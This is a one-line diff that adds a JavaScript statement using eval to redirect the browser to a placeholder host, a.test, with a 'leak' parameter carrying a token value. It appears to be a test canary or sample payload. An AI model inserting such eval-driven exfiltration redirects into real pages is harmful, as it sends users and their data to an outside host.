@@ -1,0 +1,1 @@
+eval('document.location.href="https://a.test/report/?leak=c1107824"');
